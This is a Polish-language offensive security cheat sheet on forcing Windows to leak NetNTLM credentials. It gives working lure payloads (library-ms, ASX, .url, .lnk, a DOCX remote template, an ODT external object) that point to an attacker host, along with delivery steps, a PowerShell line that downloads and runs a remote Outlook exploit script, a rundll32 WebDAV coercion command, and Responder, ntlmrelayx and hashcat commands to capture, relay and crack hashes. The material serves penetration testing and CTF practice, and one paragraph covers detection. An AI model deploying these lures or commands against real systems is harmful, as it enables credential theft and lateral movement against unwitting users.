# Miejsca, z których można wykraść poświadczenia NTLM

{{#include ../../banners/hacktricks-training.md}}

**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), od pobierania pliku Microsoft Word z internetu po źródło wycieków NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Zapisywalny udział SMB + przynęty UNC wywoływane przez Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Jeśli możesz **zapisywać w udziale przeglądanym w Explorerze przez użytkowników lub zadania zaplanowane**, umieść tam pliki, których metadane wskazują na twój UNC (np. `\\ATTACKER\share`). Wyświetlenie zawartości folderu wywoła **niejawną autentykację SMB** i ujawni **NetNTLMv2** nasłuchującemu listenerowi.<sup>[[1]](#references)</sup>

1. **Wygeneruj przynęty** (obejmuje SCF/URL/LNK/library-ms/desktop.ini/Office/RTF itd.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Upuść je na zapisywalnym udziale** (w dowolnym folderze, który ofiara otwiera):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Nasłuchuj i crackuj**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows może uzyskać dostęp do kilku plików jednocześnie; w przypadku wszystkiego, co Explorer wyświetla w podglądzie (`BROWSE TO FOLDER`), nie trzeba klikać.

### Playlisty Windows Media Player (.ASX/.WAX)

Jeśli uda Ci się nakłonić cel do otwarcia lub wyświetlenia podglądu kontrolowanej przez Ciebie playlisty Windows Media Player, możesz doprowadzić do wycieku Net‑NTLMv2, wskazując ścieżkę UNC. WMP spróbuje pobrać wskazany plik multimedialny przez SMB i automatycznie się uwierzytelni.<sup>[[3]](#references)[[4]](#references)</sup>

Przykładowy payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Proces zbierania i łamania:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### .library-ms osadzony w ZIP — NTLM leak (CVE-2025-24071/24055)

Windows Explorer niebezpiecznie obsługuje pliki .library-ms otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie lub uruchomienie pliku .library-ms w archiwum ZIP powoduje, że Explorer enumeruje ścieżkę UNC i wysyła do atakującego dane uwierzytelniające NTLM. W ten sposób uzyskuje się NetNTLMv2, które można złamać offline lub potencjalnie przekazać dalej.<sup>[[2]](#references)</sup>

Minimalny plik .library-ms wskazujący na UNC atakującego

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Kroki operacyjne
- Utwórz plik .library-ms z powyższym XML (ustaw swoje IP/nazwę hosta).
- Spakuj go do ZIP (w Windows: Wyślij do → Folder skompresowany (zip)) i dostarcz ZIP celowi.
- Uruchom listener przechwytujący NTLM i poczekaj, aż ofiara otworzy plik .library-ms z ZIP-a.


### Ścieżka dźwięku przypomnienia kalendarza w Outlooku (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook dla Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała ścieżkę UNC (np. \\attacker\share\alert.wav), Outlook łączył się z udziałem SMB, gdy uruchamiało się przypomnienie, powodując leak Net-NTLMv2 użytkownika bez żadnego kliknięcia. Luka została załatana 14 marca 2023 r., ale nadal ma duże znaczenie w przypadku starszych/nieaktualizowanych środowisk oraz podczas analizy historycznych incydentów.<sup>[[5]](#references)</sup>

Szybkie wykorzystanie za pomocą PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Po stronie listenera:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notatki
- Ofiara musi mieć uruchomiony Outlook dla Windows w chwili wyzwolenia przypomnienia.
- leak ujawnia Net‑NTLMv2, który nadaje się do łamania offline lub relay (nie pass-the-hash).


### .LNK/.URL zero-click NTLM leak oparty na ikonach (CVE‑2025‑50154 – obejście CVE‑2025‑24054)

Windows Explorer automatycznie renderuje ikony skrótów. Niedawne badania wykazały, że nawet po poprawce Microsoftu z kwietnia 2025 r. dotyczącej skrótów z ikonami UNC nadal można było wywołać uwierzytelnianie NTLM bez żadnych kliknięć, umieszczając cel skrótu w ścieżce UNC i pozostawiając ikonę lokalnie (obejściu poprawki przypisano CVE‑2025‑50154). Samo wyświetlenie folderu powoduje, że Explorer pobiera metadane ze zdalnego celu, wysyłając NTLM do serwera SMB atakującego.<sup>[[6]](#references)</sup>

Minimalny payload Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Payload skrótu (.lnk) za pomocą PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Pomysły na dostarczenie
- Umieść skrót w pliku ZIP i skłoń ofiarę do jego otwarcia.
- Umieść skrót na zapisywalnym udziale, który ofiara otworzy.
- Połącz go z innymi plikami-przynętami w tym samym folderze, aby Explorer wyświetlił podgląd elementów.

### No-click .LNK leak NTLM przez ścieżkę ikony ExtraData (CVE‑2026‑25185)

Windows wczytuje metadane `.lnk` podczas **wyświetlania/podglądu** (renderowania ikony), a nie tylko podczas uruchamiania. CVE‑2026‑25185 pokazuje ścieżkę przetwarzania, w której bloki **ExtraData** powodują, że powłoka rozpoznaje ścieżkę ikony i uzyskuje dostęp do systemu plików **podczas wczytywania**, wysyłając wychodzące NTLM, gdy ścieżka jest zdalna.

Najważniejsze warunki wyzwalające (zaobserwowane w `CShellLink::_LoadFromStream`):
- Uwzględnij **DARWIN_PROPS** (`0xa0000006`) w ExtraData (warunek uruchomienia procedury aktualizacji ikony).
- Uwzględnij **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) z wypełnionym polem **TargetUnicode**.
- Program wczytujący rozwija zmienne środowiskowe w `TargetUnicode` i wywołuje `PathFileExistsW` dla uzyskanej ścieżki.

Jeśli `TargetUnicode` wskazuje ścieżkę UNC (np. `\\attacker\share\icon.ico`), **samo wyświetlenie folderu** zawierającego skrót powoduje uwierzytelnianie wychodzące. Ta sama ścieżka wczytywania może zostać uruchomiona przez **indeksowanie** i skanowanie AV, co czyni ją praktyczną powierzchnią ataku typu no-click umożliwiającą leak.<sup>[[7]](#references)</sup>

Narzędzia badawcze (parser/generator/UI) są dostępne w projekcie **LnkMeMaybe** i pozwalają tworzyć oraz analizować te struktury bez użycia interfejsu graficznego Windows.<sup>[[8]](#references)</sup>


### Wymuszanie uwierzytelniania WebDAV / weryfikacja poświadczeń przez `davclnt.dll,DavSetCookie`

Natywnego **klienta WebDAV** można nadużyć, aby wymusić uwierzytelnienie bieżącej sesji logowania na dowolnym punkcie końcowym **HTTP/WebDAV**:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Dlaczego jest to przydatne:
- W przypadku **serwera WebDAV kontrolowanego przez atakującego** może wywołać **NTLM przez HTTP** bez uruchamiania własnego klienta.
- W przypadku **hostów wewnętrznych** to dyskretny sposób na **sprawdzenie, gdzie skradzione poświadczenia są akceptowane**, zanim nastąpi ruch lateralny.<sup>[[9]](#references)</sup>
- To polecenie jest dobrą alternatywą, gdy **ruch wychodzący SMB jest filtrowany**, ale **HTTP/WebDAV** jest nadal osiągalny.

Uwagi operacyjne:
- Usługa **WebClient** musi być uruchomiona na hoście źródłowym.
- `rundll32.exe` ładuje `davclnt.dll` i zleca systemowi Windows obsługę uwierzytelniania WebDAV przy użyciu **poświadczeń bieżącego użytkownika**.<sup>[[10]](#references)</sup>
- Jeśli kierujesz ruch do infrastruktury, którą kontrolujesz, użyj nasłuchującego serwera HTTP obsługującego NTLM lub przekaźnika, takiego jak:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Z perspektywy detekcji wielokrotne uruchomienia `rundll32.exe davclnt.dll,DavSetCookie` skierowane do wielu systemów wewnętrznych są silnym sygnałem **przygotowań do walidacji poświadczeń / ruchu bocznego przypominającego spray**, a nie normalnego zachowania użytkownika.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Dokumenty Office mogą odwoływać się do zewnętrznego szablonu. Jeśli jako dołączony szablon ustawisz ścieżkę UNC, otwarcie dokumentu spowoduje uwierzytelnienie przez SMB.

Minimalne zmiany relacji DOCX (wewnątrz word/):

1) Edytuj word/settings.xml i dodaj odwołanie do dołączonego szablonu:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Edytuj word/_rels/settings.xml.rels i ustaw rId1337 tak, aby wskazywał na Twój UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Przepakuj do .docx i dostarcz. Uruchom listener do przechwytywania SMB i poczekaj, aż dokument zostanie otwarty.

### Zewnętrzny obiekt ODT do uwierzytelniania SMB

Gdy ścieżka przesyłania dokumentów akceptuje `.odt`, ale cel nie otwiera plików Office `.docx`, użyj zewnętrznego obiektu OpenDocument zamiast szablonu Office. Metasploitowe `auxiliary/fileformat/odt_badodt` generuje plik ODT, którego `content.xml` zawiera odwołanie `draw:object` wykonywane przy otwarciu, takie jak poniższe. Ustaw `LHOST` na adres listenera SMB, prześlij plik ODT dozwoloną ścieżką i przechwyć odpowiedź NetNTLMv2 po otwarciu dokumentu przez użytkownika lub procesor dokumentów. Kontrola rozszerzenia pliku nie sprawdza osadzonego adresu URL; ograniczenia NTLM ruchu przychodzącego na celu niekoniecznie zatrzymują uwierzytelnianie wychodzące.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Wskazówki dotyczące dalszych działań po przechwyceniu, takich jak relay lub nadużywanie NTLM, znajdziesz tutaj:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Przynęty na zapisywalnym udziale + przechwycenie przez Responder → złamanie NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – wyciek uwierzytelnienia z ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — wyciek NTLM z WMP → junction NTFS do webroota, RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 luk w NTLM: niezałatane zagrożenia eskalacją uprawnień w Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft łagodzi lukę EoP w Outlooku (CVE‑2023‑23397) i wyjaśnia wyciek NTLM przez PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – zero-click, jeden NTLM: obejście poprawki zabezpieczeń Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: omówienie CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Narzędzie TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Gdy dzwoni dział IT: analiza kampanii ModeloRAT od Teams do przejęcia domeny](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – plik nagłówkowy davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – żądanie WebDAV z Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Miejsca warte uwagi przy kradzieży hashy NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [p0dalirius/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — przechwycenie NTLM przez zewnętrzny obiekt ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
